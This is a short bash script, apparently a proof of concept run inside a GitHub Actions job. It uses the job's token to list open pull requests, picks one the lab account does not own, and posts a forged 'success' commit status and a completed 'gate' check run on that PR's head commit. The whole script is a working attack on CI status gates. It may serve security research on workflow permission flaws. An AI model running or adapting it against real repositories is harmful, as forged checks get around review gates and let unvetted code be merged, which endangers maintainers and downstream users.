#!/bin/bash
API="https://api.github.com"
H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
R="$GITHUB_REPOSITORY"
echo "FRG|CTX|event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
# Discover OTHER people's open PRs with the token I was handed - no pre-baked target.
curl -s "${H[@]}" "$API/repos/$R/pulls?state=open&per_page=20" > /tmp/prs
python3 -c "
import json
for p in json.load(open('/tmp/prs')):
    print('FRG|OPENPR|%s|%s|head=%s|author=%s' % (p['number'], p['title'][:40], p['head']['sha'], p['user']['login']))
"
TGT=$(python3 -c "
import json
for p in json.load(open('/tmp/prs')):
    if p['user']['login'] != 'oxionash-ghec-lab':
        print(p['head']['sha']); break
")
echo "FRG|TARGET|$TGT (a PR I do not own)"
if [ -n "$TGT" ]; then
  code=$(curl -s -o /tmp/o -w '%{http_code}' -X POST "${H[@]}" \
    -d "{\"state\":\"success\",\"context\":\"gate\",\"description\":\"forged from a fork-authored merge_group job\"}" \
    "$API/repos/$R/statuses/$TGT")
  echo "FRG|FORGE-COMMIT-STATUS|$code|$(head -c 200 /tmp/o | tr -d '\n')"
  code=$(curl -s -o /tmp/o -w '%{http_code}' -X POST "${H[@]}" \
    -d "{\"name\":\"gate\",\"head_sha\":\"$TGT\",\"status\":\"completed\",\"conclusion\":\"success\"}" \
    "$API/repos/$R/check-runs")
  echo "FRG|FORGE-CHECK-RUN|$code|$(head -c 200 /tmp/o | tr -d '\n')"
fi
echo "FRG|DONE|forge.sh completed unconditionally"
